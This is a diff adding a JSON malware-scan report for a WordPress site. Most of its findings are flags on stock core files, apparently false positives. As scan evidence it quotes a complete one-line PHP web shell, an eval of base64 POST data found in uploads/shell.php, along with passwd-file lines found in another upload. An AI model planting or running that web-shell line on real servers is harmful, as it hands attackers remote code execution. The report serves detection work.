@@ -1,0 +1,440 @@
+{
+ "scanned": 3114,
+ "detected": 46,
+ "verifiedByChecksum": 0,
+ "coverage": {
+  "discovered": 3789,
+  "eligible": 3114,
+  "scanned": 3114,
+  "skipped": 675,
+  "verified": 0,
+  "cached": 0,
+  "errors": 0,
+  "reasons": {
+   "path": 0,
+   "extension": 675,
+   "oversized": 0,
+   "excluded": 0,
+   "unreadable": 0,
+   "archive_limit": 0
+  },
+  "complete": true,
+  "content": {
+   "complete": true,
+   "discovered": 0,
+   "collected": 0,
+   "skipped": 0,
+   "bytes": 0,
+   "scanned": 0
+  }
+ },
+ "diagnostics": [
+  "Maltrail definitions are unavailable: Maltrail definition manifest is unavailable.",
+  "No cached Maltrail definitions are available."
+ ],
+ "signature_indexes": {
+  "amwscan_bundle": {
+   "version": "2026.09.08.1",
+   "sequence": 2026090801,
+   "manifest_sha256": "38d8e8817b41ad1f5646fb2133b3c623448ca3e1726da11377fea69ad9fa6113"
+  },
+  "known_malware_md5_prefixes": {
+   "records": 58461,
+   "source_sha256": "ade029fecf954ba6dfc417bb686bddd2db3f4469b450a343c34305f23e9aa90e"
+  },
+  "legacy_core_sha256": {
+   "records": 6352,
+   "source_sha256": "1edba14109a38ca93428b278251a376f17bce50294562fac9e1c145310b2b346"
+  }
+ },
+ "findings": [
+  {
+   "id": "1ea1176b4a45cca639b3af949aef113b4558b9e541ef3cd662810573edad405a",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:4f4983a1",
+   "subject": "/var/www/html/wp-admin/includes/class-ftp.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 4f4983a1)",
+   "status": "open",
+   "evidence": {
+    "line": null,
+    "match": "strtotime($el[\"date\"]); if($t!==-1 and $t!==false) @touch($local.\"/\".$el[\"name\"],",
+    "content_hash": "98ce3cfb581e3aa48bfd94a5ecf7686d6f45d39fd9dd9d216cbc69d87825bd23"
+   },
+   "first_seen_at": "2026-09-29T15:35:57+00:00",
+   "last_seen_at": "2026-09-29T15:35:57+00:00"
+  },
+  {
+   "id": "d3637f3fd531bffc1f030a2ef8f585278ba0eecda356c64a77021715e9353f57",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "function:exec",
+   "subject": "/var/www/html/wp-admin/includes/class-wp-debug-data.php",
+   "severity": "warn",
+   "message": "Potentially dangerous function `exec`",
+   "status": "open",
+   "evidence": {
+    "line": 798,
+    "match": "exec( 'gs --version' )",
+    "content_hash": "8a0dd30bb92883fc7c224b453f26b83c07fb867668d608f31097abbbd3155073"
+   },
+   "first_seen_at": "2026-09-29T15:36:03+00:00",
+   "last_seen_at": "2026-09-29T15:36:03+00:00"
+  },
+  {
+   "id": "deab5201f47d293d62a4976677f6a4abfbdfc56637f43f2fbc75e0200230bf24",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "function:posix_getpwuid",
+   "subject": "/var/www/html/wp-admin/includes/class-wp-filesystem-direct.php",
+   "severity": "warn",
+   "message": "Potentially dangerous function `posix_getpwuid`",
+   "status": "open",
+   "evidence": {
+    "line": 265,
+    "match": "posix_getpwuid( $owneruid )",
+    "content_hash": "ea36309a25f5a6beb4b4ec1b56e866c82cbe55604b01fb12314d1f66e5e1cc22"
+   },
+   "first_seen_at": "2026-09-29T15:36:04+00:00",
+   "last_seen_at": "2026-09-29T15:36:04+00:00"
+  },
+  {
+   "id": "7b220e78f9e8da6970a93576368f77ee88cae221813038f8af4c22c56f3cdb05",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "function:posix_getpwuid",
+   "subject": "/var/www/html/wp-admin/includes/class-wp-filesystem-ssh2.php",
+   "severity": "warn",
+   "message": "Potentially dangerous function `posix_getpwuid`",
+   "status": "open",
+   "evidence": {
+    "line": 479,
+    "match": "posix_getpwuid( $owneruid )",
+    "content_hash": "8a13b6fcbe38cfef4f4f1bdafc6895f9718d850f2b779aaddd0a6ca888c3025b"
+   },
+   "first_seen_at": "2026-09-29T15:36:05+00:00",
+   "last_seen_at": "2026-09-29T15:36:05+00:00"
+  },
+  {
+   "id": "365667eb29318589481ad6d3a8af7ed80777795de75163169c8cd88a7b5565af",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:2e0e3ce5",
+   "subject": "/var/www/html/wp-admin/includes/schema.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 2e0e3ce5)",
+   "status": "open",
+   "evidence": {
+    "line": 1303,
+    "match": "Password: PASSWORD",
+    "content_hash": "a446ddd76ce401fc8173bfee4e79a98f8c3567ed3ba7560c2f167ca85e6976b0"
+   },
+   "first_seen_at": "2026-09-29T15:36:29+00:00",
+   "last_seen_at": "2026-09-29T15:36:29+00:00"
+  },
+  {
+   "id": "863d9f397c30c7ceb11f54a1af0f5edab0dc9b61f8a9d763b1d0a30fca1a3d8f",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:2e0e3ce5",
+   "subject": "/var/www/html/wp-admin/includes/upgrade.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 2e0e3ce5)",
+   "status": "open",
+   "evidence": {
+    "line": 597,
+    "match": "Password: %3$s",
+    "content_hash": "0d1d0e6e9c135452641b5a518ba41f6907e67ac668d27d5e38690f53e846527e"
+   },
+   "first_seen_at": "2026-09-29T15:36:34+00:00",
+   "last_seen_at": "2026-09-29T15:36:34+00:00"
+  },
+  {
+   "id": "d9266329439cff24d72f3dbff63e69238573cf18f1e4ce4b0ded405e3f60ac17",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:f014edd7",
+   "subject": "/var/www/html/wp-content/plugins/hello-x/hello-x.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: f014edd7)",
+   "status": "open",
+   "evidence": {
+    "line": 6,
+    "match": "$a = gzinflate(base64_decode(\"",
+    "content_hash": "6eae3f0be3f0963493d9e510b3fe994b231bb76f3115d5b130d21e1a8ec73cb9"
+   },
+   "first_seen_at": "2026-09-29T15:36:52+00:00",
+   "last_seen_at": "2026-09-29T15:36:52+00:00"
+  },
+  {
+   "id": "09342436527cf129d7573a4101f4d2804379836dc19a6e3221cd7fa832719f95",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "exploit:eval_base64",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "RCE (Remote Code Execution), through Base64 text, allow remote attackers to execute arbitrary commands or code on the target machine",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "eval(base64_decode($_POST[\"x\"])",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "dbb3efd4d260e1d5f3ae3ff766c3e73fedd6cf64fbc0bdcb27c6abd405087ba9",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "exploit:execution",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "RCE (Remote Code Execution) allow remote attackers to execute PHP code on the target machine via HTTP",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "eval(base64_decode($_POST[\"x\"])",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "d78454799eb9eeab2e802e1a39b992efd388ffcf6969be0a2985ecc5d2c5b5e4",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "exploit:silenced_eval",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "RCE (Remote Code Execution) allow remote attackers to execute PHP code on the target machine",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "@eval(base64_decode($_POST[\"x\"])",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "26806aff9d7d9cc46c1e569b61f405923b637fcec576a9f52d95033e47650bde",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:58ed5617",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 58ed5617)",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "<?php @eval(base64_decode(",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "5f2543aebbce212c5d150c495289a5f09e447c9ffd9e31bc7be510970e3dba33",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:325a1b21",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 325a1b21)",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "@eval(base64_decode($_POST[",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "6474a0099332e14de7abb11f7df118cf3915420493ba74936611c812d9a18fd0",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:ef47ca95",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: ef47ca95)",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "<?php @eval(base64_decode($_POST[\"x\"])); ?>\n",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "d3a05b215ee1424acf7593a16995f03bfb075ed9e41f6d28d0a01910787f2289",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:9840fa03",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 9840fa03)",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "<?php @eval(base64_decode($_POST[\"x\"])); ?>",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "06030221eb0a446683b41ccffe8aaeec6f44caddc491dcad490182a36ccdf8eb",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "function:eval",
+   "subject": "/var/www/html/wp-content/uploads/2026/09/shell.php",
+   "severity": "warn",
+   "message": "Potentially dangerous function `eval`",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "eval(base64_decode($_POST[\"x\"]))",
+    "content_hash": "7b82ec513ccf8849e99d9bd18b63a37f3c2a5dbf248a03f1d078f5814060ce18"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "b1f3f82751a87ca19c756be9e2ee4597ff269c41b973ec093efb66a56e613e69",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:608dc015",
+   "subject": "/var/www/html/wp-content/uploads/link.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 608dc015)",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "root:x:0:0:root:/root:/bin/sh\n",
+    "content_hash": "e5ba5a900ac9a524c47b8ab2686bb87bd62ddde50c8c46245a96de117cdcaa8b"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "b1f3f82751a87ca19c756be9e2ee4597ff269c41b973ec093efb66a56e613e69",
+   "kind": "malware",
+   "provider": "builtin",
+   "rule_id": "sign:608dc015",
+   "subject": "/var/www/html/wp-content/uploads/link.php",
+   "severity": "danger",
+   "message": "Malware Signature (hash: 608dc015)",
+   "status": "open",
+   "evidence": {
+    "line": 5,
+    "match": "sync:x:5:0:sync:/sbin:/bin/sync\n",
+    "content_hash": "e5ba5a900ac9a524c47b8ab2686bb87bd62ddde50c8c46245a96de117cdcaa8b"
+   },
+   "first_seen_at": "2026-09-29T15:36:58+00:00",
+   "last_seen_at": "2026-09-29T15:36:58+00:00"
+  },
+  {
+   "id": "04d1dfc890b5bb7e05224ab5f34dc54fcbbcefdbe56b67bdb5ce545e93a48a3c",
+   "kind": "integrity",
+   "provider": "builtin-signatures",
+   "rule_id": "integrity:historical-core",
+   "subject": "/var/www/html/wp-includes/blocks/accordion-heading/style-rtl.css",
+   "severity": "warn",
+   "message": "A restricted core directory contains a file matching a historical core release.",
+   "status": "open",
+   "evidence": {
+    "sha256": "7f79b847baf7a8f07f025b778c21bba5edceef8d228f70eccf6de5cb29ca3934",
+    "content_hash": "a7a23769f84f139b5f2b84ee716ff217760a1d816915ec94ae30c6a2813a70dc"
+   },
+   "first_seen_at": "2026-09-29T15:37:31+00:00",
+   "last_seen_at": "2026-09-29T15:37:31+00:00"
+  },
+  {
+   "id": "2d16ed15dce707ad0a85cc440025ceab22ea20f6429d6264f1083311c1e0cb8c",
+   "kind": "integrity",
+   "provider": "builtin-signatures",
+   "rule_id": "integrity:historical-core",
+   "subject": "/var/www/html/wp-includes/blocks/accordion-heading/style-rtl.min.css",
+   "severity": "warn",
+   "message": "A restricted core directory contains a file matching a historical core release.",
+   "status": "open",
+   "evidence": {
+    "sha256": "fa9ccc4c5322c06f745b27c8176a7e4f31e71b22828cacf068723a4e30730eda",
+    "content_hash": "8dc20377e42412d142cc15aba7910c060ee2cd952ff7a08a7ed5fd31ec2290cc"
+   },
+   "first_seen_at": "2026-09-29T15:37:31+00:00",
+   "last_seen_at": "2026-09-29T15:37:31+00:00"
+  },
+  {
+   "id": "28840da31c385f6ec934a45ad841f9ec22bb0d90f34e99e4471887131bbc6ca7",
+   "kind": "integrity",
+   "provider": "builtin-signatures",
+   "rule_id": "integrity:historical-core",
+   "subject": "/var/www/html/wp-includes/blocks/accordion-heading/style.css",
+   "severity": "warn",
+   "message": "A restricted core directory contains a file matching a historical core release.",
+   "status": "open",
+   "evidence": {
+    "sha256": "7f79b847baf7a8f07f025b778c21bba5edceef8d228f70eccf6de5cb29ca3934",
+    "content_hash": "a7a23769f84f139b5f2b84ee716ff217760a1d816915ec94ae30c6a2813a70dc"
+   },
+   "first_seen_at": "2026-09-29T15:37:31+00:00",
+   "last_seen_at": "2026-09-29T15:37:31+00:00"
+  },
+  {
+   "id": "afa9fc45c98ff48bb7c332752ff3dceefdd6d9c456c2100d5bf5fb4383cf67a0",
+   "kind": "malware",
+   "provider": "builtin-source-size",
+   "rule_id": "file_size:oversized_script_file",
+   "subject": "/var/www/html/wp-includes/js/dist/block-editor.js",
+   "severity": "warn",
+   "message": "This unusually large script may conceal malicious code. Only a bounded raw-signature screening was performed to protect scanner stability; review it manually.",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "File size: 3779971 bytes; automatic scan limit: 1048576 bytes",
+    "content_hash": "3a3744f6196133ff2ce0f3769667d1cf25a2e4bc0936460ec16c39268a3cd7fd"
+   },
+   "first_seen_at": "2026-09-29T15:39:24+00:00",
+   "last_seen_at": "2026-09-29T15:39:24+00:00"
+  },
+  {
+   "id": "c840f162f4dc5bfbb42ade29d6eeb52468f38e9bdd3439ac8d555cc02a049b34",
+   "kind": "malware",
+   "provider": "builtin-source-size",
+   "rule_id": "file_size:oversized_script_file",
+   "subject": "/var/www/html/wp-includes/js/dist/block-editor.min.js",
+   "severity": "warn",
+   "message": "This unusually large script may conceal malicious code. Only a bounded raw-signature screening was performed to protect scanner stability; review it manually.",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "File size: 1411452 bytes; automatic scan limit: 1048576 bytes",
+    "content_hash": "72cbf44f5f43a69b18425496ad639cf43a12c8ad91e240c69c652de20484ac68"
+   },
+   "first_seen_at": "2026-09-29T15:39:24+00:00",
+   "last_seen_at": "2026-09-29T15:39:24+00:00"
+  },
+  {
+   "id": "22fd9363970c258edce35622a738d44c230d853934f0bafdf4dc5e2f54571f1d",
+   "kind": "malware",
+   "provider": "builtin-source-size",
+   "rule_id": "file_size:oversized_script_file",
+   "subject": "/var/www/html/wp-includes/js/dist/block-library.js",
+   "severity": "warn",
+   "message": "This unusually large script may conceal malicious code. Only a bounded raw-signature screening was performed to protect scanner stability; review it manually.",
+   "status": "open",
+   "evidence": {
+    "line": 1,
+    "match": "File size: 3025740 bytes; automatic scan limit: 1048576 bytes",
+    "content_hash": "c86641cf66fcbffd08dac0350db2ee17e1c9aa9ecec89669e217a0b71ef2e85c"
+   },
+   "first_seen_at": "2026-09-29T15:39:24+00:00",
+   "last_seen_at": "2026-09-29T15:39:24+00:00"
+  }
+ ]
+}
